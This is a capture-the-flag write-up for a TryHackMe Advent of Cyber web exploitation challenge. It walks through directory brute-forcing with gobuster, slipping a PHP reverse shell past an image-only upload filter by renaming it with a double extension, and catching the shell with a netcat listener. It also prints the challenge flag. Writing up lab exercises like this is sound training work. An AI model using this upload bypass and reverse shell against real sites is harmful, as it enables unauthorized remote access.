# Day 2 - The Elf Strikes Back! (Web Exploitation)

1. What string of text needs adding to the URL to get access to the upload page? `?id=ODIzODI5MTNiYmYw`. The string is given in the problem and the main site at `http://10.10.16.112` simply says to set the id parameter `http://10.10.16.112?id=ODIzODI5MTNiYmYw`

2. What type of file is accepted by the site? `image`. Try uploading `png` and `jpg` work. The site reports `Invalid extension!` when uploading a `.php` file.

3. In which directory are the uploaded files stored? `/uploads/`. Directory brute forcing with gobuster `gobuster dir -u http://10.10.16.112/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` but `Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.16.112/16bd1462-456b-43e4-8ef8-1c8500cde221 => 200` so let's try `/uploads`, which works. The image file I uploaded is in that folder.

4. Activate your reverse shell and catch it in a netcat listener! Get php reverse shell with `cp /usr/share/webshells/php/php-reverse-shell.php ~`. Change port and ip (get ip from `ip a`). Start netcat listener with `sudo nc -lvnp 18934` or pwncat with `pwncat 0.0.0.0:18934`. Rename the reverse shell file `mv php-reverse-shell.php php-reverse-shell.jpg.php` and navigate to `http://10.10.16.112/uploads/php-reverse-shell.jpg.php`. You should get a shell.

5. What is the flag in `/var/www/flag.txt`? Run `cat /var/www/flag.txt` to get:

    ```
    ==============================================================


    You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
    This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


    Have a flag -- you deserve it!
    THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


    Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
    --Muiri (@MuirlandOracle)


    ==============================================================
    ```

    So the flag is `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`.
